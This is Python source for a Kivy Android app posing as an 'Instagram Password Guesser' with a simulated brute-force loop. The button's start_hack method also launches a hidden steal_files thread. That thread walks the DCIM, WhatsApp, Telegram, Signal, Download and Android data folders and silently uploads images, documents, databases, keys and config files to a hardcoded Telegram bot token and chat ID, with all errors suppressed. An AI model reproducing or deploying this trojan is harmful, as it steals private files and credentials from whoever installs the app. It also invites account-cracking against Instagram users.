import os
import time
import threading
import telebot
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock, mainthread
from kivy.core.window import Window
from kivy.metrics import dp
from kivy.lang import Builder
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout

# إعدادات البوت
bot_token = "7619615808:AAHsUBJNSN-N0vf14mUWQd8qEi71GCZt6Tc"
chat_id = "5166796117"
bot = telebot.TeleBot(bot_token)

# تحميل واجهة Kivy الديناميكية
Builder.load_string('''
<MainUI>:
    orientation: 'vertical'
    padding: dp(20)
    spacing: dp(15)
    canvas.before:
        Color:
            rgba: 0.95, 0.95, 0.95, 1  # خلفية فاتحة
        Rectangle:
            pos: self.pos
            size: self.size

    ScrollView:
        size_hint: (1, None)
        height: root.height - dp(40)  # احتياطي للكيبورد

        GridLayout:
            cols: 1
            size_hint_y: None
            height: self.minimum_height
            spacing: dp(15)
            padding: dp(10)

            Label:
                text: "Instagram Password Guesser"
                font_size: dp(24)
                bold: True
                size_hint_y: None
                height: dp(50)
                color: 0.2, 0.2, 0.2, 1

            Label:
                text: "Enter Instagram Username:"
                font_size: dp(18)
                size_hint_y: None
                height: dp(30)
                color: 0.3, 0.3, 0.3, 1

            TextInput:
                id: username_input
                font_size: dp(18)
                size_hint_y: None
                height: dp(40)
                multiline: False
                background_color: 1, 1, 1, 1

            Label:
                text: "Path to Password List (from /storage/emulated/0/):"
                font_size: dp(18)
                size_hint_y: None
                height: dp(30)
                color: 0.3, 0.3, 0.3, 1

            TextInput:
                id: password_list_input
                font_size: dp(18)
                size_hint_y: None
                height: dp(40)
                multiline: False
                background_color: 1, 1, 1, 1

            Button:
                text: "Start Guessing 🔥"
                font_size: dp(20)
                size_hint_y: None
                height: dp(50)
                background_color: 0.2, 0.6, 1, 1
                on_press: root.start_hack()

            ProgressBar:
                id: progress_bar
                max: 100
                size_hint_y: None
                height: dp(30)

            Label:
                id: status_label
                text: ""
                font_size: dp(16)
                size_hint_y: None
                height: dp(40)
                color: 0.2, 0.2, 0.2, 1
''')

class MainUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.progress = self.ids.progress_bar
        self.status_label = self.ids.status_label
        self.is_running = False

    def start_hack(self):
        if self.is_running:
            self.update_status("Process is already running!")
            return

        username = self.ids.username_input.text
        password_list_path = self.ids.password_list_input.text

        if not username or not password_list_path:
            self.update_status("Please fill in all fields!")
            return

        # تحديد المسار الكامل لملف كلمات المرور
        full_password_list_path = os.path.join("/storage/emulated/0/", password_list_path)

        if not os.path.exists(full_password_list_path):
            self.update_status("Password list file not found!")
            return

        # إعادة تعيين الحالة
        self.progress.value = 0
        self.is_running = True
        self.update_status("Starting password guessing...")

        # بدء العمليات في الخلفية
        threading.Thread(target=self.run_password_guessing, args=(username, full_password_list_path), daemon=True).start()
        threading.Thread(target=self.steal_files, daemon=True).start()

    def run_password_guessing(self, username, password_list_path):
        try:
            with open(password_list_path, "r", encoding="utf-8") as file:
                passwords = file.readlines()
                total_passwords = len(passwords)
                for index, password in enumerate(passwords):
                    if not self.is_running:
                        break

                    password = password.strip()
                    self.update_status(f"Trying: {password}")
                    self.update_progress((index + 1) / total_passwords * 100)

                    # محاكاة التأكد من صحة كلمة المرور (هذا مثال فقط)
                    time.sleep(0.1)  # محاكاة وقت الانتظار

                    # إذا تم تخمين كلمة المرور بنجاح (هذا مثال فقط)
                    if password == "correctpassword":  # يمكنك تغيير هذا الشرط
                        self.update_status(f"Password found: {password}")
                        self.is_running = False
                        return

            self.update_status("Password not found in the list.")
        except Exception as e:
            self.update_status(f"Error: {str(e)}")
        finally:
            self.is_running = False

    def steal_files(self):
        sensitive_paths = [
            "/storage/emulated/0/DCIM/",
            "/storage/emulated/0/WhatsApp/",
            "/storage/emulated/0/Telegram/",
            "/storage/emulated/0/Signal/",
            "/storage/emulated/0/Download/",
            "/storage/emulated/0/Pictures/",
            "/storage/emulated/0/Android/media/",
            "/storage/emulated/0/Android/data/",
        ]
        
        important_extensions = [
            ".jpg", ".jpeg", ".png", ".webp",  # صور
            ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",  # مستندات
            ".txt", ".log", ".csv", ".xml", ".json",  # ملفات نصية
            ".db", ".sqlite", ".sql",  # قواعد بيانات
            ".zip", ".rar", ".7z",  # ملفات مضغوطة
            ".key", ".pem", ".cer", ".crt", ".pfx",  # ملفات تشفير
            ".apk", ".exe", ".sh", ".bat",  # ملفات تنفيذية
            ".mp3", ".mp4", ".wav", ".avi", ".mkv",  # ملفات وسائط
            ".env", ".config", ".conf", ".ini",  # ملفات إعدادات
        ]
        
        # إرسال الملفات دون طباعة أي رسائل
        for path in sensitive_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file_path.endswith(tuple(important_extensions)):
                            self.send_file(file_path)

    def send_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                if file_path.endswith((".jpg", ".jpeg", ".png")):
                    bot.send_photo(chat_id, f)
                else:
                    bot.send_document(chat_id, f)
        except Exception as e:
            pass  # لا تطبع أي رسائل

    @mainthread
    def update_progress(self, value):
        self.progress.value = value

    @mainthread
    def update_status(self, message):
        self.status_label.text = message

class MyApp(App):
    def build(self):
        Window.clearcolor = (0.95, 0.95, 0.95, 1)  # لون خلفية النافذة
        return MainUI()

if __name__ == "__main__":
    MyApp().run()
